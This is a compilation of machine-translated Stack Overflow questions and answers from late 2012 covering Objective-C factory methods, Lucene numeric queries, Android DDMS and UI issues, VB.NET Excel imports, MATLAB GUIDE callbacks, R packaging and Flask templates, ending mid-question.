> 赞同：0
> 
> 时间：2012-12-28T19:23:35.350
> 
> 标签：objective-c, ios, initialization, nsobject

我不知道这个问题有什么意义。但是我想知道我们如何在`NSObject`不使用任何`initializers.`我所见的情况下为 an 创建新实例，我可以通过`NSMutableArray`这两种方式创建新实例。

```
NSMutableArray *myArray = [[NSMutableArray alloc]init]; 
```

一般来说，我会使用方法或任何其他方法为我`NSObject`上面的方法创建一个实例，但我不知道如何创建一个方法，如下例..`init:``designated initializers.`

```
NSMutableArray *myArray = [NSMutableArray array]; 
```

我看过文档`NSMutableArray`，它是`NSArray`. 并且也`NSArray`有这样的方法来实现上面的例子。

```
+(id)array; 
```

但我想知道`array:`方法内部的代码是什么。否则如何为我自己编写一个与此相同的方法`NSObject`？在投票之前问我，如果你想要更多的解释。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T19:26:21.433

在您的 SomeObject 类中添加此类方法

```
+(SomeObject)object{
 SomeObject *object = [[self alloc] init];
 //You can do something else to your object here.
 return object;
} 
```

然后在您项目的其他地方，您可以导入 SomeObject 并执行以下操作：

```
SomeObject *myObject = [SomeObject object]; 
```

基本上这就是 NSArray 所做的一切。如果您希望自己的 NSObject 执行类似这样的添加类方法 (+)，该方法返回它自己的实例。在该方法中，只需分配 init，对该对象执行任何其他操作，然后返回它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-28T19:40:17.287

从 Apples 文档[Object Initialization](http://developer.apple.com/library/ios/#documentation/general/conceptual/CocoaEncyclopedia/Initialization/Initialization.html)中，您可以推断出在创建对象时实际上不需要初始化：

> 初始化将对象的实例变量设置为合理且有用的初始值

如果您的代码不需要初始化实例变量，那么从技术上讲，您不必`init`. 然而，有这么多`caveats`（见链接），在实践中做一个`init`是你应该做的。我能想到的唯一例外是您从头开始显式创建了对象类，而不是基于 NSObject 之类的东西——那么您就知道一切都处于什么状态。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-28T19:25:31.743

您看到的是对象上的类方法。[NSMutableArray 数组]; 正在创建一个分配的数组并将其返回给您。在 arc 之前，这很重要，因为它还会返回给您一个自动释放的数组。但是要回答您的问题，它是在幕后调用 alloc/init 函数。

另请注意，“alloc”是分配内存的函数，而 init 是在分配对象后初始化对象的函数。您可以使用其他关键字来分配内存，例如“复制”和“新”，但我怀疑这就是您要寻找的。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-28T19:37:25.940

您必须在某处为对象分配内存。在`[NSMutableArray array]`它调用 +(id) 数组的情况下，它看起来像这样：

```
+(id)array
{
  return [[NSMutableArray alloc] init];
} 
```

它必须在某处分配内存并初始化对象，但您可以将 init 隐藏在类方法中，就像上面示例中所做的那样。

# java - 如何在 Lucene 4 中搜索 int 字段？

> ID：14074613
> 
> 赞同：17
> 
> 时间：2012-12-28T19:23:52.640
> 
> 标签：java, lucene

我正在尝试实现文档索引（大致对应于 DB 行），其中一个字段是整数。我将它们添加到索引中，例如：

```
Document doc = new Document();
doc.add(new StringField("ticket_number", rs.getString("ticket_number"),
        Field.Store.YES));
doc.add(new IntField("ticket_id", rs.getInt("ticket_id"),
        Field.Store.YES));
doc.add(new StringField("id_s", rs.getString("ticket_id"),
        Field.Store.YES));
w.addDocument(doc); 
```

似乎我根本无法查询该`ticket_id`字段，而`id_s`工作得很好。

其中一份文件是（为了便于阅读，我添加了空格）：

```
Document<
    stored,indexed,tokenized,omitNorms,indexOptions=DOCS_ONLY<ticket_number:230114W> 
    stored<ticket_id:152> 
    stored,indexed,tokenized,omitNorms,indexOptions=DOCS_ONLY<id_s:152>> 
```

所以我的 int 字段被存储，但没有被索引。此查询按预期工作：`id_s:152`，而此查询从不返回任何内容：`ticket_id:152`。

我究竟做错了什么？如何将这样的字段添加到索引并使其可搜索？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-12-28T22:10:30.670

以下对我有用：

```
 RAMDirectory idx = new RAMDirectory();
    IndexWriter writer = new IndexWriter(
            idx,
            new IndexWriterConfig(Version.LUCENE_40, new ClassicAnalyzer(Version.LUCENE_40))
    );
    Document document = new Document();
    document.add(new StringField("ticket_number", "t123", Field.Store.YES));
    document.add(new IntField("ticket_id", 234, Field.Store.YES));
    document.add(new StringField("id_s", "234", Field.Store.YES));
    writer.addDocument(document);
    writer.commit();

    IndexReader reader = DirectoryReader.open(idx);
    IndexSearcher searcher = new IndexSearcher(reader);

    Query q1 = new TermQuery(new Term("id_s", "234"));
    TopDocs td1 = searcher.search(q1, 1);
    System.out.println(td1.totalHits);  // prints "1"

    Query q2 = NumericRangeQuery.newIntRange("ticket_id", 1, 234, 234, true, true);
    TopDocs td2 = searcher.search(q2, 1);
    System.out.println(td2.totalHits);  // prints "1" 
```

正如 femtoRgon 所指出的，对于数值（长整数、日期、浮点数等），您需要具有`NumericRangeQuery`并指定精度。否则 Lucene 不知道你想如何定义相似性。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-02-15T09:56:17.997

另一个答案来自这个线程（第三个答案）：[Lucene 4.0 IndexWriter updateDocument for Numeric Term](https://stackoverflow.com/questions/13958431/lucene-4-0-indexwriter-updatedocument-for-numeric-term)

基本上，您使用您的 int 值创建一个 Term ，如下所示：

```
String field = "myfield";
int value = 4711;
BytesRef bytes = new BytesRef(NumericUtils.BUF_SIZE_INT);
NumericUtils.intToPrefixCoded(value, 0, bytes);
Term term = new Term(field, bytes); 
```

然后你可以使用这个词来搜索，或者删除/更新你的索引。在第一次测试中，这对我来说很好。但是，我不知道这是否是“正确”的做事方式。我之前使用 NumericRangeFilter 来过滤 IntField，但现在我倾向于使用这种方法并使用常规的 TermsFilter 或 TermQueries 代替。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-12-28T21:42:42.080

可以使用[NumericRangeQuery](http://lucene.apache.org/core/4_0_0-BETA/core/org/apache/lucene/search/NumericRangeQuery.html)查询数字字段。对于精确匹配，只需将最大值和最小值设置为相等的值。

指示字段未编入索引的输出可能是由于与文本值相比，数字值的索引方式不同。考虑到字段被转换成Lucene的数值表示，字面值`152`确实不会被索引

但是，乍一看，您对 id_s 的处理可能是更好的选择。ID 通常不作为数值处理，而只是作为碰巧用数字表示的简单标识符。如果您不需要对字段进行数字排序或范围查询，那么索引`StringField`当然更有意义。

# android - Android 设备不会出现在 DDMS 中

> ID：14074614
> 
> 赞同：2
> 
> 时间：2012-12-28T19:24:04.603
> 
> 标签：android, eclipse, macos, adb, ddms

我是 mac 新手，正在尝试使用各种 Android 设备进行开发。直到今天，当 Android 设备根本不会出现在 Eclipse 的 DDMS 视图中时，一切都运行良好。我尝试使用终端查找连接的 Android 设备：

```
~adb devices 
```

设备列表为空。模拟器在 DDMS 视图以及命令行的设备列表中显示良好。

我尝试了以下方法：

1.  断开设备与计算机的连接。

2.  重新启动计算机。

3.  重启设备。

4.  连接设备。

5.  `adb kill-server`,`adb start-server`

似乎没有任何效果。任何建议将不胜感激。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-28T19:41:53.810

首先确保您的设备以“仅充电”模式连接，以便在测试时不会将 sd 卡安装在本地系统上。

接下来，如果您在 Ubunutu 上，如 Android Dev 网站上所述[，](http://developer.android.com/tools/device.html#setting-up)您需要设置用于开发的设备才能在列表中看到它。

> 如果您在 Ubuntu Linux 上进行开发，则需要添加一个 udev 规则文件，其中包含您要用于开发的每种设备的 USB 配置。在规则文件中，每个设备制造商都由唯一的供应商 ID 标识，由 ATTR{idVendor} 属性指定。

**编辑：**所以你在 Mac 上，然后稍微查找一下就会抛出[这个 SO 问题](https://stackoverflow.com/questions/4435031/adb-devices-list-empty-snow-leopard)。根据帖子，这是解决方法：

> Mac OS X 上的 ADB 在安装 EasyTether 驱动程序后停止识别连接的设备。使用 kextload/kextunload 从内存中手动卸载 EasyTetherUSBEthernet.kext 内核扩展。它在 /System/Library/Extensions/

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-17T14:03:04.787

首先在设备上启动 USB 调试（在设置>应用程序>开发人员选项中）。

仍然有问题，请尝试以下链接。 [http://developer.android.com/tools/device.html](http://developer.android.com/tools/device.html)

它帮助我检测到我的 Micromax Canvas Hd

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-02-25T13:47:36.010

在 Emulator 中运行任何项目。运行项目时，您可以在 DDMS 中看到设备。

# sql-server-2008-r2 - 将excel 2010导入sql 2010

> ID：14074615
> 
> 赞同：1
> 
> 时间：2012-12-28T19:24:07.593
> 
> 标签：sql-server-2008-r2, vb.net-2010, excel-2010, import-from-excel

使用 sql 2008 r2、vb.net 2010、excel 2010、xls 模式下的文件

我想通过 vb.net 以编程方式将 excel 电子表格导入 sql 2010。我有 2 个版本的电子表格。第一个是我用于 SQL 导入向导导入表的原始表（导入向导中显示的工作表名称是 Dictionary$）。

第二个版本是从 sql 导出到 excel（因为我做了很多手动更改）。

我可以看到文件之间的明显差异是：

1.  导入向导中的工作表名称在字典后没有 $。
2.  电子表格中的每个单元格都有一个'（单元格开头的单引号'）。

现在到问题的问题。以编程方式执行此操作并使用第二个版本（导出）将毫无问题地导入所有预先存在的行，但如果我将行添加到电子表格中，则导入将看不到这些行。

如果我尝试以编程方式导入原始电子表格，则不会导入任何行，因为它在 excel 文件中找不到表字典（字典在向导的末尾显示 $）。

我正在寻找的解决方案是：

*   我需要在 excel 文件中启用什么以允许以编程方式导入 SQL 吗？
*   我可以对从 sql 导出的文件做些什么，以便如果我添加行，它可以在以后需要时重新导入？

代码如下，请注意以下代码适用于电子表格的第二个版本，并且使用 SQL 导出向导生成它。此外，如果我将行添加到电子表格的底部，这些行将不会以编程方式导入。

```
Private Shared Sub ImportDictionary()
        Dim curFile As String = "dictionary.xls"
        Dim fullPath As String = Path.GetFullPath(curFile)
        Dim Excelconnection = New OleDbConnection("provider=Microsoft.Jet.OLEDB.4.0; data source=" + fullPath + "; Extended Properties='Excel 8.0;HDR=Yes;IMEX=1'")
        Dim myConnection As New SqlConnection(SQLdbString)
        Try
            myConnection.Open()
            Excelconnection.Open()
            Dim mySelectQuery As String = "SELECT * from dictionary"
            Dim myCommand2 As New OleDbCommand(mySelectQuery, Excelconnection)
            Dim myReader2 As OleDbDataReader
            myReader2 = myCommand2.ExecuteReader()
            While myReader2.Read()
                Dim myCommand As New SqlCommand
                Try
                    myCommand.Connection = myConnection
                    MyQueue.Enqueue(String.Format("{0} {1} {2} {3} {4}", myReader2.GetString(0), myReader2.GetString(1), myReader2.GetString(2), myReader2.GetString(3), myReader2.GetString(4)))
                    myCommand.Parameters.Add("@G0", SqlDbType.VarChar).Value = myReader2.GetString(0)
                    myCommand.Parameters.Add("@G1", SqlDbType.VarChar).Value = myReader2.GetString(1)
                    myCommand.Parameters.Add("@G2", SqlDbType.VarChar).Value = myReader2.GetString(2)
                    myCommand.Parameters.Add("@G3", SqlDbType.VarChar).Value = myReader2.GetString(3)
                    myCommand.Parameters.Add("@G4", SqlDbType.VarChar).Value = myReader2.GetString(4)
                    myCommand.CommandText = "INSERT INTO dictionary values(@G0,@G1,@G2,@G3,@G4)"
                    myCommand.ExecuteNonQuery()
                Catch e As Exception
                    Console.WriteLine(e.ToString())
                Finally
                    myCommand.Dispose()
                End Try
            End While
        Catch e As Exception
            Console.WriteLine(e.ToString())
        Finally
            myConnection.Dispose()
        End Try
        Excelconnection.Dispose()
    End Sub 
```

# android - 在 ListActivity 中检测滑动手势

> ID：14074622
> 
> 赞同：1
> 
> 时间：2012-12-28T19:25:18.007
> 
> 标签：android, listview, scrollview, listactivity, swipe

我用谷歌搜索了很多关于我的问题，但我找不到答案。我有一个`ListActivity`显示来自我的 sqlite 数据库的不同条目。如果列表大于屏幕，它会自动变为可滚动的。我找到了一个检测滑动手势的教程，并实现了代码。布局是 ListView，`android:id = "android:id/list"`我也有一个空的`View`，它放置在列表上，它将接收手势。这在我的程序中`View`被调用。`v`这是我的代码：

```
public class ListViewActivity extends ListActivity implements OnClickListener {

    // Cursor
    private SimpleCursorAdapter adapter;
    private Cursor cursor;

    // Database
    private DBAccess dbAccess;

    // Gesture
    private static final int SWIPE_MIN_DISTANCE = 120;
    private static final int SWIPE_MAX_OFF_PATH = 250;
    private static final int SWIPE_THRESHOLD_VELOCITY = 200;
    private GestureDetector gestureDetector;
    View.OnTouchListener gestureListener;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        // Remove title bar
        this.requestWindowFeature(Window.FEATURE_NO_TITLE);
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_listview);

        /* ... */

        // Gesture detection
        gestureDetector = new GestureDetector(new MyGestureDetector());
        gestureListener = new View.OnTouchListener() {
            public boolean onTouch(View v, MotionEvent event) {
                Log.v("ListViewActivity", "onTouch");
                return gestureDetector.onTouchEvent(event);
            }
        };

        View v = (View) findViewById(R.id.listview_view1);
        //v.setOnClickListener(ListViewActivity.this); 
        v.setOnTouchListener(gestureListener);
    }

    @Override
    protected void onListItemClick(ListView l, View v, int position, long id) {     
        Cursor item = (Cursor) getListAdapter().getItem(position);

        Log.v("onListItemClick(...)", String.valueOf(id));

        Intent intent = new Intent(ListViewActivity.this, ListClickActivity.class);
        intent.putExtra("id", item.getString(0));
        startActivity(intent);
    }

    public void onClick(View v) {
        // TODO Auto-generated method stub
        Log.v("ListViewActivity", "onClick");
        //Filter f = (Filter) v.getTag();
        //FilterFullscreenActivity.show(this, input, f);
    }

    class MyGestureDetector extends SimpleOnGestureListener {
        @Override
        public boolean onFling(MotionEvent e1, MotionEvent e2, float velocityX, float velocityY) {
            Log.v("ListViewActivity", "onFling");
            try {
                if (Math.abs(e1.getY() - e2.getY()) > SWIPE_MAX_OFF_PATH)
                    return false;
                // right to left swipe
                if(e1.getX() - e2.getX() > SWIPE_MIN_DISTANCE && Math.abs(velocityX) > SWIPE_THRESHOLD_VELOCITY) {
                    Log.v("onFling", "Left Swipe");
                    Toast.makeText(ListViewActivity.this, "Left Swipe", Toast.LENGTH_SHORT).show();
                }  else if (e2.getX() - e1.getX() > SWIPE_MIN_DISTANCE && Math.abs(velocityX) > SWIPE_THRESHOLD_VELOCITY) {
                    Log.v("onFling", "Right Swipe");
                    Toast.makeText(ListViewActivity.this, "Right Swipe", Toast.LENGTH_SHORT).show();
                }
            } catch (Exception e) {
                // nothing
            }
            return false;
        }

    }
} 
```

如果我禁用该行`v.setOnClickListener(ListViewActivity.this)`，我可以滚动并单击列表中的项目，但如果我激活此行，我会收到滑动手势，但我无法再滚动列表。

希望你们中的某个人有一个想法来解决我的问题！

# matlab - 带有单选按钮和滑块的刷新指南

> ID：14074624
> 
> 赞同：0
> 
> 时间：2012-12-28T19:25:30.723
> 
> 标签：matlab, slider, radio-button, matlab-guide

我有一个包含单选按钮和滑块的问题。我的目的是：当滑块的值发生变化时，必须重新运行该时刻选中的单选按钮中的代码才能刷新效果。

te 滑块的最大值、最小值和步长在打开函数中定义，当前值定义为`handles.value`。

这是我的滑块代码。

```
function slider1_Callback(hObject, eventdata, handles)
% hObject    handle to slider1 (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    structure with handles and user data (see GUIDATA)

handles.svalue = get(handles.slider1, 'Value');

guidata(hObject, handles) 
```

这是我的单选按钮组选择更改代码。

```
function uipanel3_SelectionChangeFcn(hObject, eventdata, handles)
% hObject    handle to the selected object in uipanel3 
% eventdata  structure with the following fields (see UIBUTTONGROUP)
%   EventName: string 'SelectionChanged' (read only)
%   OldValue: handle of the previously selected object or empty if none was selected
%   NewValue: handle of the currently selected object
% handles    structure with handles and user data (see GUIDATA)
switch get(eventdata.NewValue,'Tag') % Get Tag of selected object.
    case 'hte'
        h_te = zeros(handles.rows, handles.colums);

        for m = handles.row_0:handles.rows
            gauss = fspecial('gaussian',[1 round(1+handles.svalue*(m-handles.row_0+1))], (0.3*round(1+handles.svalue*(m-handles.row_0+1))));
            h_te(m,:,1) = filter2(gauss, handles.img_d(m,:,1));
            h_te(m,:,2) = filter2(gauss, handles.img_d(m,:,2));
            h_te(m,:,3) = filter2(gauss, handles.img_d(m,:,3));
            h_te(handles.rows-m+1,:,1) = filter2(gauss, handles.img_d(handles.rows-m+1,:,1));
            h_te(handles.rows-m+1,:,2) = filter2(gauss, handles.img_d(handles.rows-m+1,:,2));
            h_te(handles.rows-m+1,:,3) = filter2(gauss, handles.img_d(handles.rows-m+1,:,3));
        end

        axes(handles.axes2);
        imshow(h_te);

    case 'hc'
        h_c = zeros(handles.rows, handles.colums);

        for m = handles.row_0:handles.rows
            gauss = fspecial('gaussian',[1 round(1+handles.svalue*(m-handles.row_0+1))], (0.3*round(1+handles.svalue*(m-handles.row_0+1))));
            h_c(m-handles.row_0+1,:,1) = filter2(gauss, handles.img_d(m-handles.row_0+1,:,1));
            h_c(m-handles.row_0+1,:,2) = filter2(gauss, handles.img_d(m-handles.row_0+1,:,2));
            h_c(m-handles.row_0+1,:,3) = filter2(gauss, handles.img_d(m-handles.row_0+1,:,3));
            h_c(handles.rows-m+handles.row_0,:,1) = filter2(gauss, handles.img_d(handles.rows-m+handles.row_0,:,1));
            h_c(handles.rows-m+handles.row_0,:,2) = filter2(gauss, handles.img_d(handles.rows-m+handles.row_0,:,2));
            h_c(handles.rows-m+handles.row_0,:,3) = filter2(gauss, handles.img_d(handles.rows-m+handles.row_0,:,3));
        end

        axes(handles.axes2);
        imshow(h_c);

    case 'vlr'
        v_lr = zeros(handles.rows, handles.colums);

        for m = handles.colum_0:handles.colums
            gauss = fspecial('gaussian',[round(1+handles.svalue*(m-handles.colum_0+1)) 1], (0.3*round(1+handles.svalue*(m-handles.colum_0+1))));
            v_lr(:,m,1) = filter2(gauss, handles.img_d(:,m,1));
            v_lr(:,m,2) = filter2(gauss, handles.img_d(:,m,2));
            v_lr(:,m,3) = filter2(gauss, handles.img_d(:,m,3));
            v_lr(:,handles.colums-m+1,1) = filter2(gauss, handles.img_d(:,handles.colums-m+1,1));
            v_lr(:,handles.colums-m+1,2) = filter2(gauss, handles.img_d(:,handles.colums-m+1,2));
            v_lr(:,handles.colums-m+1,3) = filter2(gauss, handles.img_d(:,handles.colums-m+1,3));
        end

        axes(handles.axes2);
        imshow(v_lr);

    case 'vc'
        v_c = zeros(handles.rows, handles.colums);

        for m = handles.colum_0:handles.colums
            gauss = fspecial('gaussian',[round(1+handles.svalue*(m-handles.colum_0+1)) 1], (0.3*round(1+handles.svalue*(m-handles.colum_0+1))));
            v_c(:,m-handles.colum_0+1,1) = filter2(gauss, handles.img_d(:,m-handles.colum_0+1,1));
            v_c(:,m-handles.colum_0+1,2) = filter2(gauss, handles.img_d(:,m-handles.colum_0+1,2));
            v_c(:,m-handles.colum_0+1,3) = filter2(gauss, handles.img_d(:,m-handles.colum_0+1,3));
            v_c(:,handles.colums-m+handles.colum_0,1) = filter2(gauss, handles.img_d(:,handles.colums-m+handles.colum_0,1));
            v_c(:,handles.colums-m+handles.colum_0,2) = filter2(gauss, handles.img_d(:,handles.colums-m+handles.colum_0,2));
            v_c(:,handles.colums-m+handles.colum_0,3) = filter2(gauss, handles.img_d(:,handles.colums-m+handles.colum_0,3));
        end

        axes(handles.axes2);
        imshow(v_c);

end
guidata(hObject, handles) 
```

我认为在滑块中调用 uipanel3 函数可以工作，但它没有。这就是我认为可行的方法。

```
function slider1_Callback(hObject, eventdata, handles)
% hObject    handle to slider1 (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    structure with handles and user data (see GUIDATA)

handles.svalue = get(handles.slider1, 'Value');

uipanel3_SelectionChangeFcn(hObject, eventdata, handles);

guidata(hObject, handles) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-28T20:14:50.373

它不起作用，因为 hObject 和 eventdata 用于滑块，而不是用于按钮组，因此 eventdata 不包含您要查找的字段。您可以手动生成带有必填字段的事件数据，尽管这有点小技巧，而且 Oldvalue 并不是它应该的样子......

尝试

```
eventdata_new.EventName = 'SelectionChanged';
eventdata_new.OldValue = get(handles.uipanel3,'SelectedObject');
eventdata_new.NewValue = get(handles.uipanel3,'SelectedObject');

uipanel3_SelectionChangeFcn(handles.uipanel3, eventdata_new, handles); 
```

代替

```
uipanel3_SelectionChangeFcn(hObject, eventdata, handles); 
```

# android - 操作栏选项卡中的 MapFragment

> ID：14074625
> 
> 赞同：9
> 
> 时间：2012-12-28T19:25:30.700
> 
> 标签：android, android-layout, android-fragments, android-maps, google-maps-android-api-2

我正在尝试构建一个将实现操作栏选项卡的应用程序。其中一个选项卡应包含 MapFragment。

**如何实现带有选项卡的操作栏，其中一个是地图片段？**

你能帮我解决这个问题吗？

这是我到目前为止所拥有的：

主班

```
package com.nfc.demo;

import android.app.ActionBar;
import android.app.ActionBar.Tab;
import android.app.Activity;
import android.app.Fragment;
import android.app.FragmentTransaction;
import android.os.Bundle;

public class NFCDemoActivity extends Activity {

  Tab selectedTab = null;

  public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    ActionBar bar = getActionBar();
    bar.setDisplayShowHomeEnabled(false);
    bar.setDisplayShowTitleEnabled(false);

    bar.setNavigationMode(ActionBar.NAVIGATION_MODE_TABS);

    bar.setCustomView(R.layout.main);

    ActionBar.Tab mapTab = bar.newTab().setText("Map");
    ActionBar.Tab settingsTab = bar.newTab().setText("Settings");
    ActionBar.Tab aboutTab = bar.newTab().setText("About");

    MapFragment mapFragment = new MapFragment();
    SettingsFragment settingsFragment = new SettingsFragment();
    AboutFragment aboutFragment = new AboutFragment();

    mapTab.setTabListener(new TabListener(mapFragment));
    settingsTab.setTabListener(new TabListener(settingsFragment));
    aboutTab.setTabListener(new TabListener(aboutFragment));

    Tab selectedTab = (Tab) getLastNonConfigurationInstance();

    if (selectedTab == null) {
      bar.addTab(mapTab, false);
      bar.addTab(settingsTab, false);
      bar.addTab(aboutTab, true);
    }

    setContentView(R.layout.main);

  }

  public Object onRetainNonConfigurationInstance() {
    return selectedTab;
  }

  protected boolean isRouteDisplayed() {
      return false;
  }

  protected class TabListener implements ActionBar.TabListener {
    private Fragment fragment;

    public TabListener(Fragment fragment) {
        this.fragment = fragment;
    }

    public void onTabSelected(Tab tab, FragmentTransaction fragmentTransaction) {
        fragmentTransaction.replace(R.id.mainFragment, this.fragment, null);
        selectedTab = tab;
    }

    public void onTabUnselected(Tab tab, FragmentTransaction fragmentTransaction) {
        fragmentTransaction.remove(this.fragment);
    }

    public void onTabReselected(Tab tab, FragmentTransaction fragmentTransaction) {
        //do nothing
    }
  }
} 
```

Fragment 类都只是返回一个带有 .xml 布局的充气器。

XML 布局：

main.xml（地图应该在这个 XML 文件上）

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:id="@+id/mainFragment"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="horizontal" >

</LinearLayout> 
```

settings.xml 和 about.xml

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="horizontal" >

    <TextView
        android:id="@+id/textView123"
        android:text="asdfg"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content" />

</LinearLayout> 
```

但是添加`MapFragment`thws 一个错误：

```
Error inflating class fragment 
error caused by java.lang.IllegalArgumentException: 
Binary XML file line #2: Duplicate id 0x7f040005, tag null, or parent id 0x1020002 with another fragment for com.google.android.gms.maps.MapFragment 12-28 21:14:07.991: E/AndroidRuntime(26189): at android.app.Activity.onCreateView(Activity.java:4722) 
```

几天来我一直在试图弄清楚如何进行，但我真的很困惑。任何帮助/提示将不胜感激。

还有，怎么`getLastNonConfigurationInstance()`办？它已被弃用。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-01-22T19:58:02.240

在以下解决方案中，可以将 GoogleMap 添加到操作栏选项卡/下拉列表。这样做的关键在于正确设置您的片段以在切换到操作栏中的另一个片段时销毁 MapFragment。

**创建一个实现 Action Bar 功能的 Activity：**

1.  在 Eclipse 中创建一个项目，将 Tabs 用于主要活动。如果您不这样做，请继续执行步骤 2-5。
2.  创建一个扩展`Activity`和实现的类`ActionBar.OnNavigationListener`。
3.  创建一个布局 XML 文件，该文件是您在选项卡片段之间切换时的容器。
4.  在您的 Activity 类中实现/覆盖以下方法：`public boolean onNavigationItemSelected(int position, long id)`.
5.  在此方法中，在对象之间切换`position`以确定所选选项卡并使用 FragmentManager 将片段设置为新实例，如下所示`getFragmentManager().beginTransaction().replace(R.id.container, fragment).commit()`：

**创建一个包含地图的片段：**

1.  创建一个扩展`Fragment`以用作选项卡片段的类。阅读 [ [1](https://developers.google.com/maps/documentation/android/start) ] 以更好地理解 MapFragment。
2.  创建一个包含片段元素的布局 XML 文件（如 [ [1](https://developers.google.com/maps/documentation/android/start) ] 中所示）。使用该页面中的 XML 创建一个布局 XML 文件并在您的片段类中使用它。
3.  通过覆盖在您的片段类中扩展该布局 XML 文件`onCreateView`。
4.  您的应用程序现在应该在使用您的片段类的选项卡中显示地图，但是，切换到另一个选项卡并返回到地图选项卡将导致重复的视图 ID。要克服这一点，请继续下一步。
5.  在您的片段类中，重写以下方法以专门销毁底层 GoogleMap 对象，以便在地图选项卡再次加载您的片段类时重新创建它：

```
 @Override
    public void onDestroyView() {
        super.onDestroyView();
        MapFragment f = (MapFragment) getFragmentManager().findFragmentById(R.id.map);
        if (f != null) 
            getFragmentManager().beginTransaction().remove(f).commit();
    } 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-01-17T21:53:02.573

不知道你是否已经解决了。您必须将 google play 服务添加为库项目才能使其正常工作。首先，我尝试添加 jar 文件，但没有奏效。

# r - 使用 R 包分发半实时数据集的方法有哪些？

> ID：14074627
> 
> 赞同：13
> 
> 时间：2012-12-28T19:25:55.830
> 
> 标签：r, packaging

我正在使用[`devtools`](https://github.com/hadley/devtools/). 我想让包从文件/连接中加载数据（根据构建包的日期而有所不同）。数据量很大，因此最好在构建包期间一次性解析和加载数据。

目前，我有一个 data.R 文件，该文件`R/`将数据分配给包级变量，这些值是在包安装期间分配的（或者至少这是看起来正在发生的事情）。这种不太理想的设置大部分都有效。为了使包的所有实例都具有相同的数据，我必须将数据文件与包一起分发（目前它`inst/`在构建包之前由帮助脚本复制到），而不是仅仅将它们全部打包在一起。一定会有更好的办法。

如：

*   在包构建期间生成 .rda 文件（但这需要在包安装期间不运行相同的代码）
    *   我可以用 Makefile 做到这一点，但这似乎有点矫枉过正
    *   我可以拥有仅在包构建期间而不是在安装期间运行的 R 代码吗？
*   运行 R 代码`data/`
    *   但是数据是使用相关包中的代码进行处理的。我可以用`Collate`（我认为）来解决这个问题，但是我必须维护所有`.R`文件的顺序（但是由于增加了复杂性，我还不如使用 Makefile？）
*   构建两个包，一个包含我想要的所有代码，一个包含数据。
*   显而易见，聪明的事情我没有想到。

tl;dr：有哪些方法可以将动态更改数据的快照添加到为部署而冻结的 R 包？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-09T18:53:55.907

正如@BenBolker[在上面的评论中指出的那样](https://stackoverflow.com/questions/14074627/what-methods-exist-for-distributing-a-semi-live-dataset-with-an-r-package#comment19519889_14074627)，将数据集拆分到不同的包中是社区中的先例（最值得注意的是核心包`datasets`），并且具有额外的好处。

函数与数据的分离还使得使用最新函数更容易处理数据的历史版本。

我目前有一个`tools-to-munge`包和一个`things-to-munge`包。使用帮助脚本，我可以在两个包中构建`tools-to-munge`并设置一个`Suggests`（或`Depends`）`DESCRIPTION`以指向包的适当递增版本。`tools-to-munge`构建新包后，我可以`things-to-munge`根据需要使用包中的函数构建`tools-to-munge`包。

# python - Flask 蓝图模板的最佳布局？

> ID：14074628
> 
> 赞同：3
> 
> 时间：2012-12-28T19:26:02.167
> 
> 标签：python, jinja2, flask

在 Flask 中，似乎有两种定义模板的方法：

1.  应用级：

    ```
    app/
        templates/
            index.html
            user/
                index.html 
    ```

2.  和蓝图级别：

    ```
    app/
        user/
            templates/
                index.html
        templates/
            index.html 
    ```

两者似乎都有效，但一个比另一个更好吗？如果不是，每种方法的优点/缺点是什么？

关于蓝图的文档并不多，因此我们将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-29T06:39:20.140

我认为缺点确实取决于您的计划，以及您将使用应用程序做什么。如果您将在蓝图级别中有模板，那么您的应用程序会更加灵活，以防您想将蓝图从一个应用程序移动到另一个应用程序并且仍然将所有内容都放在一个地方。不要认为除了您的需求和应用程序架构之外应该有其他东西。

此外，您还可以为您的应用程序完全覆盖 jinja2 模板加载器，并在您想要的目录中包含模板 :) 因此，如果您不喜欢现在的方式，您可以将所有模板移动到您真正想要的目录中。像这样的东西：

```
import jinja2

my_loader = jinja2.ChoiceLoader([
    app.jinja_loader,
    jinja2.FileSystemLoader(['templates/somwehere',
                             'templates/another_place',
                             'apps/templates']),
])
app.jinja_loader = my_loader 
```

请记住，顺序在这里很重要。

# java - 在 XML 中初始化 TableLayout 并以编程方式填充它 - Android (java)

> ID：14074632
> 
> 赞同：2
> 
> 时间：2012-12-28T19:26:07.617
> 
> 标签：java, android, xml, tablelayout

我正在尝试用 XML 初始化 TableLayout，然后以编程方式填充它。这是我的 XML、java 和 LogCat 输出。

高分.java

```
public class Highscores extends Activity {

    TableLayout table;
    TableRow rowHeader, row1, row2, row3, row4, row5, row6, row7, row8, row9, row10;
    TextView rank, percentage, score;
    Button btn1;    

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.highscoresmain);

        TableLayout table = (TableLayout)findViewById(R.id.tableLayout);

